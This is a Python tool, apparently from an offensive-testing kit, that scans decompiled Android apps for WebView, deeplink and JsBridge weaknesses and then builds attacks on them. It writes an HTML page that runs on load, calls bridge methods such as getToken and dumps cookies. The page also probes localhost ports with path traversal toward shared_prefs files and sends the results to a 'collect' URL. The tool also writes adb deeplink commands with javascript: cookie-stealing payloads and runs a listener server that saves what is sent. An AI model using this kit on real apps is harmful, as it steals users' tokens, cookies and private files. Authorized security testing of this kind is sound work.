#!/usr/bin/env python3
"""WebView / Deeplink / JsBridge 静态面（授权包反编译目录）。

对齐 Playbook：传承/内窗·深链.md
Skill：杀招/内窗

只扫本地 jadx/apktool 产物。
L2 只认强标签。授权验证页走 harness（默认只回显；--collect 才回传实验室）。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import write_probe_json  # noqa: E402

PLAYBOOK = "传承/内窗·深链.md"

# name, regex, severity, strong?
CHECKS: list[tuple[str, str, str, bool]] = [
    ("deeplink-url-extra", r"get(?:String|Parcelable)?Extra\s*\(\s*[\"']url[\"']", "High", True),
    ("javascript-url", r"""loadUrl\s*\(\s*[\"']javascript:""", "High", True),
    ("file-universal", r"setAllowUniversalAccessFromFileURLs\s*\(\s*true", "Critical", True),
    ("file-file", r"setAllowFileAccessFromFileURLs\s*\(\s*true", "High", True),
    ("js-interface", r"addJavascriptInterface\s*\(", "High", True),
    ("anno-jsinterface", r"@JavascriptInterface", "High", True),
    ("ssl-proceed", r"onReceivedSslError[\s\S]{0,400}proceed\s*\(", "High", True),
    ("nanohttpd", r"NanoHTTPD", "High", True),
    ("nanohttpd-file", r"new\s+File\s*\(\s*\w+\s*,\s*uri\s*\)", "High", True),
    ("content-provider-exp", r"<provider\b[\s\S]{0,800}android:exported\s*=\s*\"true\"", "High", True),
    ("should-override", r"shouldOverrideUrlLoading\s*\(", "Medium", False),
    ("evaluate-js", r"evaluateJavascript\s*\(", "Medium", False),
    ("x5-webview", r"X5WebView|com\.tencent\.smtt", "Info", False),
    ("cordova", r"cordova\.exec\s*\(|Capacitor\.Plugins", "Medium", False),
    ("wkwebview", r"WKWebView|stringByEvaluatingJavaScriptFromString|JSContext", "Medium", True),
    ("file-asset", r"file:///android_asset/", "Info", False),
    ("loadurl", r"\.loadUrl\s*\(", "Info", False),
    ("js-enabled", r"setJavaScriptEnabled\s*\(\s*true", "Medium", False),
    ("file-access", r"setAllowFileAccess\s*\(\s*true", "Medium", False),
    ("js-prompt-bridge", r"onJsPrompt\s*\(", "Medium", False),
    ("jsbridge-name", r"WebViewJavascriptBridge", "Info", False),
    ("intent-filter", r"<intent-filter>", "Info", False),
    ("custom-scheme", r"android:scheme\s*=\s*[\"'](?!https?|geo|tel|mailto|file)[^\"']+[\"']", "Medium", False),
    ("exported-activity", r"<activity\b[\s\S]{0,400}android:exported\s*=\s*\"true\"", "Info", False),
    ("shared-prefs-key", r"(SECRET_KEY|access_token|refresh_token|session_key)", "Medium", False),
]

METHOD_RE = re.compile(
    r"@JavascriptInterface\s+(?:public\s+)?[\w.<>,\[\]\s]+\s+(\w+)\s*\(",
    re.M,
)
SMALI_ANNO = re.compile(
    r"\.annotation runtime Landroid/webkit/JavascriptInterface;[\s\S]{0,200}\.method[^\n]*\s+(\w+)\(",
    re.M,
)
SCHEME_RE = re.compile(
    r"<data\b[^>]*android:scheme\s*=\s*[\"']([^\"']+)[\"']",
    re.I,
)
HOST_RE = re.compile(
    r"<data\b[^>]*android:host\s*=\s*[\"']([^\"']+)[\"']",
    re.I,
)
IFACE_RE = re.compile(
    r"addJavascriptInterface\s*\(\s*[^,]+,\s*[\"'](\w+)[\"']",
    re.I,
)
EXTRA_NAME_RE = re.compile(
    r"get(?:String|Parcelable)?Extra\s*\(\s*[\"'](\w+)[\"']",
)

DEFAULT_METHODS = (
    "getData", "getToken", "getAccessToken", "getDeviceId", "getUserInfo",
    "readFile", "readSharedPreferences", "getSharedPreferences",
    "openUrl", "getLocation", "getAllContacts", "openCamera",
    "getClipboard", "getImei", "getAndroidId", "getPackageName",
)
DEFAULT_BRIDGES = (
    "JsBridge", "jsBridge", "JSBridge", "WebViewJavascriptBridge",
    "android", "Android", "_dsbridge", "dsBridge", "cordova", "webkit",
)
DEFAULT_PREFS_KEYS = (
    "SECRET_KEY", "access_token", "refresh_token", "session_key",
    "wt", "token", "uuid",
)
DEFAULT_EXTRAS = (
    "url", "webUrl", "web_url", "link", "path", "targetUrl", "loadUrl",
)

SKIP_DIR = {".git", "node_modules", "__pycache__"}
SCAN_EXT = {".java", ".kt", ".smali", ".xml", ".js", ".html", ".m", ".swift"}


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def _iter_files(root: Path) -> list[Path]:
    out: list[Path] = []
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        if any(part in SKIP_DIR for part in p.parts):
            continue
        if p.suffix.lower() not in SCAN_EXT:
            continue
        if p.stat().st_size > 2_000_000:
            continue
        out.append(p)
    return out


def _manifest_schemes(root: Path) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    for p in root.rglob("AndroidManifest.xml"):
        try:
            text = p.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        schemes = SCHEME_RE.findall(text)
        hosts = HOST_RE.findall(text)
        custom = [s for s in schemes if s.lower() not in {"http", "https", "geo", "tel", "mailto", "file"}]
        if not custom and not hosts:
            continue
        rows.append(
            {
                "file": str(p.relative_to(root)),
                "schemes": sorted(set(custom)),
                "hosts": sorted(set(hosts))[:20],
            }
        )
    return rows


def _js_methods(root: Path) -> list[dict[str, Any]]:
    found: list[dict[str, Any]] = []
    for path in _iter_files(root):
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        rel = str(path.relative_to(root))
        names = METHOD_RE.findall(text) + SMALI_ANNO.findall(text)
        for name in names[:20]:
            found.append({"file": rel, "method": name})
    return found


def scan_dir(root: Path) -> dict[str, Any]:
    compiled = [
        (name, re.compile(pat, re.I | re.M), sev, strong)
        for name, pat, sev, strong in CHECKS
    ]
    hits: dict[str, list[dict[str, Any]]] = {name: [] for name, _, _, _ in CHECKS}
    files = _iter_files(root)
    for path in files:
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        rel = str(path.relative_to(root))
        for name, rx, sev, _strong in compiled:
            if len(hits[name]) >= 12:
                continue
            for m in rx.finditer(text):
                if len(hits[name]) >= 12:
                    break
                line_no = text[: m.start()].count("\n") + 1
                snippet = text[max(0, m.start() - 40) : m.end() + 80].replace("\n", " ")
                hits[name].append(
                    {
                        "file": rel,
                        "line": line_no,
                        "severity": sev,
                        "snippet": snippet[:180],
                    }
                )
    present = {k: v for k, v in hits.items() if v}
    strong_hit = [
        name for name, _p, _s, strong in CHECKS if strong and present.get(name)
    ]
    methods = _js_methods(root)
    schemes = _manifest_schemes(root)
    ifaces: list[str] = []
    for path in files:
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        ifaces.extend(IFACE_RE.findall(text))
    ifaces = sorted(set(ifaces))[:20]
    extras: list[str] = []
    for path in files:
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        extras.extend(EXTRA_NAME_RE.findall(text))
    extras = sorted({e for e in extras if e.lower() not in {"action", "component"}})[:20]
    level = "L0"
    if present or methods or schemes:
        level = "L1"
    if strong_hit:
        level = "L2"
    return {
        "ts": _now(),
        "playbook": PLAYBOOK,
        "target_dir": str(root),
        "files_scanned": len(files),
        "level": level,
        "hits": present,
        "hit_kinds": sorted(present),
        "strong": strong_hit,
        "js_interface_methods": methods[:40],
        "interface_names": ifaces,
        "intent_extras": extras,
        "manifest_schemes": schemes,
        "next": (
            "强标签才 L2。scan --case 已顺带写验证页；"
            "默认只回显，--collect 才回传实验室"
        ),
    }


def _parse_ports(spec: str) -> tuple[list[int], list[int] | None]:
    """返回 (常用端口列表, 可选 [start,end] 分段扫)。full = 对方 32768-60999。"""
    spec = (spec or "").strip().lower()
    common = [3000, 8000, 8080, 8081, 8888, 9000, 9090]
    if spec in {"full", "ephemeral"}:
        return common, [32768, 60999]
    out: list[int] = []
    rng: list[int] | None = None
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            lo, hi = int(a), int(b)
            if hi - lo > 2000:
                rng = [lo, hi]
            else:
                out.extend(range(lo, hi + 1))
        else:
            out.append(int(part))
    ports = sorted(set(p for p in (out or common) if 1 <= p <= 65535))[:800]
    return ports, rng


def _case_dir(case: str) -> Path:
    return ENGINE / "案卷" / case / "测绘" / "webview"


def render_harness(
    *,
    collect: str,
    bridges: list[str],
    methods: list[str],
    pkg: str,
    ports: list[int],
    port_range: list[int] | None,
    auto_nano: bool,
    prefs_keys: list[str],
    page_title: str = "大爱仙尊 WebView 授权验证",
) -> str:
    xmls = (
        "xxx.xml", "secret.xml", "secrets.xml", "config.xml", "user.xml",
        "login.xml", "token.xml", "settings.xml",
    )
    paths = ["/", "/../../../../etc/hosts", f"/../../../../data/data/{pkg}/shared_prefs/"]
    for x in xmls:
        paths.append(f"/../../../../data/data/{pkg}/shared_prefs/{x}")
        paths.append(f"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/data/data/{pkg}/shared_prefs/{x}")
    paths += ["/../shared_prefs/", "/shared_prefs/"]
    cfg = {
        "collect": collect,
        "bridges": bridges,
        "methods": methods,
        "pkg": pkg,
        "ports": ports,
        "port_range": port_range,
        "auto_nano": auto_nano,
        "prefs_keys": prefs_keys,
        "paths": paths,
    }
    cfg_js = json.dumps(cfg, ensure_ascii=False)
    return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<title>{page_title}</title>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<style>
body{{font-family:ui-monospace,monospace;background:#111;color:#ddd;padding:12px}}
pre{{white-space:pre-wrap;word-break:break-all;background:#1c1c1c;padding:8px}}
button{{margin:4px;padding:6px 10px}}
</style>
</head>
<body>
<h3>授权 WebView / JsBridge 验证页</h3>
<p>进页自动扫桥。无桥则 dump cookie。配置了 collect 才回传实验室（sendBeacon / text/plain）。</p>
<div>
<button onclick="runBridge()">扫桥+调方法</button>
<button onclick="runNano()">扫本机 HTTP+穿越</button>
<button onclick="dumpCookie()">dump cookie</button>
</div>
<pre id="log">ready</pre>
<script>
const CFG = {cfg_js};
const logEl = document.getElementById("log");
function log(x) {{
  const line = (typeof x === "string") ? x : JSON.stringify(x, null, 2);
  logEl.textContent += "\\n" + line;
}}
function ship(kind, payload) {{
  const body = JSON.stringify({{ts: Date.now(), kind: kind, payload: payload, pkg: CFG.pkg}});
  log(body);
  if (!CFG.collect) return;
  try {{
    if (navigator.sendBeacon) {{
      navigator.sendBeacon(CFG.collect, new Blob([body], {{type:"text/plain"}}));
    }}
  }} catch (e) {{}}
  try {{
    fetch(CFG.collect, {{method:"POST", mode:"cors", body: body, headers:{{"Content-Type":"text/plain"}}}}).catch(function(){{}});
  }} catch (e) {{}}
  try {{
    const img = new Image();
    const sep = CFG.collect.indexOf("?") >= 0 ? "&" : "?";
    img.src = CFG.collect + sep + "d=" + encodeURIComponent(body.slice(0, 1500));
  }} catch (e) {{ log("collect fail " + e); }}
}}
function dumpCookie() {{
  const c = String(document.cookie || "");
  ship("cookie", {{cookie: c, has_wt: c.indexOf("wt=") >= 0}});
}}
function findBridges() {{
  const names = CFG.bridges.slice();
  const found = {{}};
  for (const n of names) {{
    try {{ if (window[n]) found[n] = typeof window[n]; }} catch (e) {{}}
  }}
  for (const k of Object.keys(window)) {{
    if (/bridge|android|webkit|cordova|capacitor|dsbridge|wvjb/i.test(k) && found[k] === undefined) {{
      try {{ found[k] = typeof window[k]; }} catch (e) {{}}
    }}
  }}
  return found;
}}
function callOne(obj, name) {{
  const keys = CFG.prefs_keys && CFG.prefs_keys.length ? CFG.prefs_keys : ["SECRET_KEY"];
  try {{
    if (typeof obj[name] === "function") {{
      const r = obj[name]();
      return {{ok:true, ret: String(r).slice(0, 800)}};
    }}
    if (typeof obj.call === "function") {{
      try {{
        obj.call(name, {{}}, function(r) {{ ship("dsbridge-cb", {{name:name, r:r}}); }});
        return {{ok:true, via:"dsBridge.call"}};
      }} catch (e1) {{
        const r = obj.call(name);
        return {{ok:true, via:"call", ret: String(r).slice(0, 800)}};
      }}
    }}
    if (typeof obj.send === "function") {{
      obj.send({{action:name}}, function(r) {{ ship("bridge-cb", {{name:name, r:r}}); }});
      if (/readSharedPreferences|getSharedPreferences|getData|getToken/i.test(name)) {{
        for (const k of keys) {{
          obj.send({{action:name, key:k}}, function(r) {{
            ship("bridge-cb", {{name:name, key:k, r:r}});
          }});
        }}
      }}
      return {{ok:true, via:"send-async"}};
    }}
    return {{ok:false, err:"no-fn"}};
  }} catch (e) {{
    return {{ok:false, err: String(e)}};
  }}
}}
function hookWVJB() {{
  if (window.WebViewJavascriptBridge && typeof window.WebViewJavascriptBridge.ready === "function") {{
    window.WebViewJavascriptBridge.ready(function(b) {{
      ship("wvjb-ready", {{ok:true}});
      for (const m of CFG.methods.slice(0, 8)) {{
        try {{
          b.callHandler(m, {{}}, function(r) {{ ship("wvjb-cb", {{name:m, r:r}}); }});
        }} catch (e) {{}}
      }}
    }});
  }}
}}
function runBridge() {{
  const found = findBridges();
  ship("bridges", found);
  dumpCookie();
  const hits = [];
  for (const name of Object.keys(found)) {{
    const obj = window[name];
    for (const m of CFG.methods) {{
      hits.push({{bridge:name, method:m, result: callOne(obj, m)}});
    }}
  }}
  if (!Object.keys(found).length) {{
    ship("no-bridge", {{fallback:"cookie"}});
  }}
  if (window.prompt) {{
    try {{
      const p = window.prompt("SE_BRIDGE_PROBE:" + JSON.stringify(CFG.methods.slice(0, 4)));
      hits.push({{bridge:"prompt", result:p}});
    }} catch (e) {{ hits.push({{bridge:"prompt", err:String(e)}}); }}
  }}
  hookWVJB();
  ship("calls", hits);
}}
function probeUrl(url, onDone) {{
  const xhr = new XMLHttpRequest();
  xhr.open("GET", url, true);
  xhr.timeout = 1200;
  xhr.onload = function() {{
    if (xhr.status === 200 && xhr.responseText) {{
      const row = {{url:url, status:xhr.status, body: xhr.responseText.slice(0, 1200)}};
      ship("nano-hit", row);
      onDone(true);
      return;
    }}
    onDone(false);
  }};
  xhr.onerror = xhr.ontimeout = function() {{ onDone(false); }};
  try {{ xhr.send(); }} catch (e) {{ onDone(false); }}
}}
function scanPortList(ports, paths, done) {{
  let i = 0;
  const jobs = [];
  ports.forEach(function(port) {{
    paths.forEach(function(path) {{
      jobs.push("http://127.0.0.1:" + port + path);
    }});
  }});
  function next() {{
    if (i >= jobs.length) {{ done(); return; }}
    const batch = jobs.slice(i, i + 24);
    i += batch.length;
    let left = batch.length;
    batch.forEach(function(url) {{
      probeUrl(url, function() {{
        if (--left === 0) setTimeout(next, 0);
      }});
    }});
  }}
  next();
}}
function runNano() {{
  const ports = CFG.ports || [];
  const paths = CFG.paths || ["/"];
  scanPortList(ports, paths, function() {{
    const rng = CFG.port_range;
    if (!rng || rng.length < 2) {{
      ship("nano-done", {{mode:"list"}});
      return;
    }}
    let cur = rng[0];
    const end = rng[1];
    const step = 80;
    function walk() {{
      if (cur > end) {{ ship("nano-done", {{mode:"range", end:end}}); return; }}
      const chunk = [];
      for (let p = cur; p < cur + step && p <= end; p++) chunk.push(p);
      cur += step;
      scanPortList(chunk, paths.slice(0, 4), walk);
    }}
    walk();
  }});
}}
window.SE_RUN = runBridge;
window.addEventListener("load", function() {{
  runBridge();
  if (CFG.auto_nano) runNano();
}});
</script>
</body>
</html>
"""


def _prefs_keys(data: dict[str, Any]) -> list[str]:
    keys = list(DEFAULT_PREFS_KEYS)
    for row in (data.get("hits") or {}).get("shared-prefs-key") or []:
        snip = str(row.get("snippet") or "")
        for k in DEFAULT_PREFS_KEYS:
            if k in snip and k not in keys:
                keys.append(k)
    return keys[:16]


def _extra_names(data: dict[str, Any]) -> list[str]:
    extras = list(DEFAULT_EXTRAS)
    for e in data.get("intent_extras") or []:
        if e and e not in extras:
            extras.append(e)
    return extras[:16]


def _deeplink_cmds(data: dict[str, Any], page: str, collect: str) -> list[str]:
    extras = _extra_names(data)
    js_alert = "javascript:alert(document.cookie)"
    js_go = f"javascript:void(window.location='{page}')"
    if collect:
        js_ck = (
            "javascript:void((new Image()).src='"
            + collect
            + "?d='+encodeURIComponent(document.cookie))"
        )
    else:
        js_ck = js_alert
    pairs: list[tuple[str, str]] = []
    for row in data.get("manifest_schemes") or []:
        for sch in row.get("schemes") or ["app"]:
            hosts = row.get("hosts") or ["open"]
            for host in hosts[:4]:
                pairs.append((sch, host))
    if not pairs:
        pairs = [("myapp", "open")]
    adb: list[str] = []
    seen: set[str] = set()

    def add(cmd: str) -> None:
        if cmd not in seen:
            seen.add(cmd)
            adb.append(cmd)

    for sch, host in pairs:
        base = f"{sch}://{host}"
        add(f"adb shell am start -a android.intent.action.VIEW -d '{base}?url={page}'")
        add(f"adb shell am start -a android.intent.action.VIEW -d '{base}/webview?url={page}'")
        for extra in extras[:6]:
            if extra == "url":
                continue
            add(f"adb shell am start -a android.intent.action.VIEW -d '{base}?{extra}={page}'")
        add(f"adb shell am start -a android.intent.action.VIEW -d '{base}?url={js_alert}'")
        add(f"adb shell am start -a android.intent.action.VIEW -d '{base}?url={js_ck}'")
        add(f"adb shell am start -a android.intent.action.VIEW -d '{base}?url={js_go}'")
        add(
            "adb shell am start -a android.intent.action.VIEW "
            f"-d '{base}' -e url '{page}'"
        )
        for extra in extras[:4]:
            add(
                "adb shell am start -a android.intent.action.VIEW "
                f"-d '{base}' -e {extra} '{page}'"
            )
    return adb[:40]


def write_harness(
    dest: Path,
    data: dict[str, Any],
    *,
    collect: str,
    pkg: str,
    ports: list[int],
    port_range: list[int] | None = None,
    auto_nano: bool | None = None,
) -> dict[str, Any]:
    dest.mkdir(parents=True, exist_ok=True)
    methods = list(DEFAULT_METHODS)
    for m in data.get("js_interface_methods") or []:
        name = str(m.get("method") or "")
        if name and name not in methods:
            methods.append(name)
    bridges = list(DEFAULT_BRIDGES)
    for n in data.get("interface_names") or []:
        if n and n not in bridges:
            bridges.insert(0, n)
    pkg_name = pkg or "com.example.app"
    if auto_nano is None:
        auto_nano = "nanohttpd" in (data.get("strong") or [])
    prefs_keys = _prefs_keys(data)
    html = render_harness(
        collect=collect,
        bridges=bridges,
        methods=methods[:40],
        pkg=pkg_name,
        ports=ports,
        port_range=port_range,
        auto_nano=bool(auto_nano),
        prefs_keys=prefs_keys,
    )
    html_path = dest / "bridge_verify.html"
    html_path.write_text(html, encoding="utf-8")
    page = (
        collect.rsplit("/", 1)[0] + "/bridge_verify.html"
        if collect
        else "http://127.0.0.1:8765/bridge_verify.html"
    )
    adb = _deeplink_cmds(data, page, collect)
    (dest / "deeplink_am.sh").write_text("#!/bin/sh\n" + "\n".join(adb) + "\n", encoding="utf-8")
    meta = {
        "ts": _now(),
        "html": str(html_path),
        "adb": adb,
        "collect": collect,
        "bridges": bridges[:15],
        "methods": methods[:20],
        "prefs_keys": prefs_keys,
        "extras": _extra_names(data),
        "pkg": pkg_name,
        "ports": ports,
        "port_range": port_range,
        "auto_nano": bool(auto_nano),
    }
    (dest / "harness.json").write_text(json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")
    return meta


def cmd_harness(args: argparse.Namespace) -> int:
    root = Path(args.dir).expanduser().resolve() if args.dir else None
    if args.hits:
        data = json.loads(Path(args.hits).read_text(encoding="utf-8"))
    elif root and root.is_dir():
        data = scan_dir(root)
    else:
        print("[!] harness 需要 --dir 或 --hits", file=sys.stderr)
        return 2
    if args.case:
        dest = _case_dir(args.case)
    elif args.out:
        dest = Path(args.out).expanduser().resolve()
        dest.mkdir(parents=True, exist_ok=True)
    else:
        print("[!] harness 必须 --case 或 --out", file=sys.stderr)
        return 2
    ports, port_range = _parse_ports(args.ports)
    auto_nano = True if args.auto_nano else None
    if args.no_auto_nano:
        auto_nano = False
    meta = write_harness(
        dest,
        data,
        collect=args.collect or "",
        pkg=args.pkg or "",
        ports=ports,
        port_range=port_range,
        auto_nano=auto_nano,
    )
    if args.case:
        write_probe_json(meta, case=args.case, case_subdir="webview", filename="harness.json")
    print(json.dumps(meta, ensure_ascii=False, indent=2))
    return 0


def cmd_listen(args: argparse.Namespace) -> int:
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    dest = _case_dir(args.case) / "collect" if args.case else Path(args.out or "/tmp/se-webview-collect")
    dest.mkdir(parents=True, exist_ok=True)
    html = dest.parent / "bridge_verify.html"
    bind = args.bind
    port = int(args.port)

    class H(BaseHTTPRequestHandler):
        def _ok(self, body: bytes, ctype: str = "application/json") -> None:
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "*")
            self.end_headers()
            self.wfile.write(body)

        def _save(self, raw: bytes) -> None:
            p = dest / f"{int(datetime.now(UTC).timestamp())}_{len(list(dest.glob('*.json')))}.json"
            p.write_bytes(raw or b"{{}}")
            print(f"[+] collect {p} {len(raw)}B")

        def do_OPTIONS(self) -> None:  # noqa: N802
            self._ok(b"{{}}")

        def do_GET(self) -> None:  # noqa: N802
            from urllib.parse import parse_qs, unquote, urlparse

            parsed = urlparse(self.path)
            if parsed.path.startswith("/bridge_verify.html") and html.is_file():
                self._ok(html.read_bytes(), "text/html; charset=utf-8")
                return
            q = parse_qs(parsed.query)
            blob = (q.get("d") or [""])[0]
            if blob:
                self._save(unquote(blob).encode("utf-8", errors="replace"))
            self._ok(b'{"ok":true,"listen":true}')

        def do_POST(self) -> None:  # noqa: N802
            n = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(n) if n else b""
            self._save(raw)
            self._ok(b'{"ok":true}')

        def log_message(self, fmt: str, *a: Any) -> None:
            print("[listen]", fmt % a)

    print(f"[*] listen http://{bind}:{port}/  → {dest}")
    print(f"[*] harness collect: http://{bind}:{port}/collect")
    ThreadingHTTPServer((bind, port), H).serve_forever()
    return 0


def cmd_doctor() -> int:
    checks: list[tuple[str, bool, str]] = []

    def add(name: str, ok: bool, detail: str) -> None:
        checks.append((name, ok, detail))
        print(f"[{'OK' if ok else 'FAIL'}] {name}: {detail}")

    add("strong-defined", any(s for _n, _p, _sv, s in CHECKS), "has strong")
    add("playbook", (ENGINE / PLAYBOOK).is_file(), PLAYBOOK)
    add("skill", (ENGINE / "杀招/内窗/SKILL.md").is_file(), "skill")
    weak = Path("/tmp/se-webview-weak")
    weak.mkdir(exist_ok=True)
    (weak / "AndroidManifest.xml").write_text(
        """<manifest>
  <application>
    <activity android:exported="true">
      <intent-filter>
        <data android:scheme="https" android:host="example.com"/>
      </intent-filter>
    </activity>
  </application>
</manifest>
""",
        encoding="utf-8",
    )
    weak_data = scan_dir(weak)
    add("weak-not-l2", weak_data["level"] != "L2", weak_data["level"])
    add("weak-no-strong", not weak_data["strong"], str(weak_data["strong"]))
    strong = Path("/tmp/se-webview-strong")
    strong.mkdir(exist_ok=True)
    (strong / "MainActivity.java").write_text(
        'webView.loadUrl(getIntent().getStringExtra("url"));\n'
        "webView.addJavascriptInterface(bridge, \"JsBridge\");\n"
        "@JavascriptInterface public String getToken() { return t; }\n"
        "settings.setAllowUniversalAccessFromFileURLs(true);\n",
        encoding="utf-8",
    )
    (strong / "AndroidManifest.xml").write_text(
        '<manifest><activity><intent-filter>'
        '<data android:scheme="myapp" android:host="open"/></intent-filter>'
        "</activity></manifest>\n",
        encoding="utf-8",
    )
    sdata = scan_dir(strong)
    need = {"deeplink-url-extra", "js-interface", "file-universal"}
    add("sample-hits", need <= set(sdata["hit_kinds"]), str(sdata["hit_kinds"]))
    add("sample-l2", sdata["level"] == "L2", sdata["level"])
    add("methods", any(m["method"] == "getToken" for m in sdata["js_interface_methods"]), str(sdata["js_interface_methods"]))
    add("scheme-myapp", any("myapp" in (r.get("schemes") or []) for r in sdata["manifest_schemes"]), str(sdata["manifest_schemes"]))
    hdir = Path("/tmp/se-webview-harness")
    if hdir.exists():
        import shutil

        shutil.rmtree(hdir)
    meta = write_harness(
        hdir, sdata, collect="", pkg="com.se.test", ports=[8080], port_range=[32768, 32968]
    )
    html = Path(meta["html"]).read_text(encoding="utf-8")
    add("harness-html", "runBridge" in html and "runNano" in html, "buttons")
    add("harness-auto-run", "SE_RUN" in html and "addEventListener(\"load\"" in html, "onload")
    add("harness-send-key", '"key":k' in html or "key:k" in html, "send+key")
    add("harness-prefs", "SECRET_KEY" in html, "SECRET_KEY")
    add("harness-cookie", "document.cookie" in html and "has_wt" in html, "cookie/wt")
    add("harness-beacon", "sendBeacon" in html and "text/plain" in html, "beacon")
    add("harness-dsbridge", "dsBridge.call" in html, "dsBridge")
    add("harness-port-range", "port_range" in html and "32768" in html, "range")
    add("harness-prefs-xml", "xxx.xml" in html and "%2e%2e" in html, "traverse xml")
    add("harness-no-default-c2", "attacker.com" not in html and '"collect": ""' in html, "no default C2")
    add("harness-methods", "getToken" in html and "getDeviceId" in html, "methods")
    add("harness-adb", any("myapp://" in x for x in meta["adb"]), str(meta["adb"][:1]))
    add("harness-adb-js", any("javascript:" in x for x in meta["adb"]), "javascript:")
    add("harness-adb-weburl", any("webUrl" in x for x in meta["adb"]), "webUrl extra")
    add("sample-extras", "url" in (sdata.get("intent_extras") or []), str(sdata.get("intent_extras")))
    meta2 = write_harness(hdir, sdata, collect="http://127.0.0.1:8765/collect", pkg="com.se.test", ports=[8080])
    html2 = Path(meta2["html"]).read_text(encoding="utf-8")
    add("harness-collect", "127.0.0.1:8765/collect" in html2, "lab collect")
    scan_out = Path("/tmp/se-webview-scan-case")
    if scan_out.exists():
        import shutil

        shutil.rmtree(scan_out)
    write_harness(scan_out, sdata, collect="", pkg="com.se.test", ports=[8080])
    add("scan-harness-html", (scan_out / "bridge_verify.html").is_file(), "scan writes html")
    failed = [c for c in checks if not c[1]]
    print(f"doctor {len(checks) - len(failed)}/{len(checks)}")
    return 1 if failed else 0


def cmd_scan(args: argparse.Namespace) -> int:
    root = Path(args.dir).expanduser().resolve()
    if not root.is_dir():
        print(f"[!] 目录不存在: {root}", file=sys.stderr)
        return 2
    data = scan_dir(root)
    if args.case:
        out = ENGINE / "案卷" / args.case / "测绘" / "webview"
        out.mkdir(parents=True, exist_ok=True)
        (out / "bridge_hits.json").write_text(
            json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8"
        )
        write_probe_json(
            data, case=args.case, case_subdir="webview", filename="probe_bridge.json"
        )
        if not args.no_harness:
            ports, port_range = _parse_ports(args.ports)
            write_harness(
                out,
                data,
                collect=args.collect or "",
                pkg=args.pkg or "",
                ports=ports,
                port_range=port_range,
            )
    if args.out:
        Path(args.out).expanduser().parent.mkdir(parents=True, exist_ok=True)
        Path(args.out).write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(data, ensure_ascii=False, indent=2))
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="WebView/Deeplink/JsBridge 静态面 + 授权验证页")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("doctor")
    sc = sub.add_parser("scan")
    sc.add_argument("--dir", required=True, help="jadx 或 apktool 输出目录")
    sc.add_argument("--case")
    sc.add_argument("--out", help="写一份 JSON")
    sc.add_argument("--pkg", default="", help="包名；scan --case 顺带写验证页")
    sc.add_argument("--collect", default="", help="实验室回传 URL，空=只回显")
    sc.add_argument("--ports", default="8080,8888,32768-32868", help="本机 HTTP；full=32768-60999")
    sc.add_argument("--no-harness", action="store_true", help="只扫不写验证页")
    hs = sub.add_parser("harness", help="生成授权验证 HTML + adb 命令")
    hs.add_argument("--dir", default="", help="jadx 目录（可与 --hits 二选一）")
    hs.add_argument("--hits", default="", help="已有 bridge_hits.json")
    hs.add_argument("--case")
    hs.add_argument("--out", help="输出目录")
    hs.add_argument("--pkg", default="", help="包名，给 NanoHTTPD 穿越路径")
    hs.add_argument("--collect", default="", help="实验室回传 URL，空=只回显")
    hs.add_argument("--ports", default="8080,8888,32768-32868", help="本机 HTTP；full=32768-60999")
    hs.add_argument("--auto-nano", action="store_true", help="进页同时扫本机 HTTP")
    hs.add_argument("--no-auto-nano", action="store_true", help="禁止进页扫端口")
    ls = sub.add_parser("listen", help="实验室收验证页 POST")
    ls.add_argument("--case")
    ls.add_argument("--out")
    ls.add_argument("--bind", default="127.0.0.1")
    ls.add_argument("--port", default="8765")
    args = ap.parse_args()
    if args.cmd == "doctor":
        return cmd_doctor()
    if args.cmd == "harness":
        return cmd_harness(args)
    if args.cmd == "listen":
        return cmd_listen(args)
    return cmd_scan(args)


if __name__ == "__main__":
    raise SystemExit(main())
